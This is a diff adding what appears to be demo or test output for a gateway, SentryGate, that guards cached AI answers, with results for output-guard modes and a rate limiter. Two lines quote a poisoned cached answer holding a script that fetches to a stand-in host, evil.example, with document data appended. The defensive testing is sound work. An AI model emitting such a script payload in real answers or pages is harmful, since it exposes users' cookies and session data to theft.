@@ -1,0 +1,17 @@
+== 1. Output guard: a cached answer with a script payload ==
+OUTPUT_GUARD=off, a user asks a reworded question:
+  200 | cache hit  | output flags -      | Click here to reset: <script>fetch("https://evil.example/?c="+document
+OUTPUT_GUARD=flag, a user asks a reworded question:
+  200 | cache hit  | output flags script | Click here to reset: <script>fetch("https://evil.example/?c="+document
+OUTPUT_GUARD=block, a user asks a reworded question:
+  403 | cache hit  | output flags script | Answer withheld by SentryGate: it contained script.
+
+== 2. Rate limiter: one caller probing the cache, limit 20 a minute ==
+  attacker sent 39 requests in one burst
+    200 answered: 18
+    403 blocked by the filter: 2
+    429 refused, rate limit: 19
+  poisoned answers the attacker got: 18 (all inside the first minute's 20)
+  a different, honest caller at the same moment: status 200
+
+Rate limit counts kept in: redis
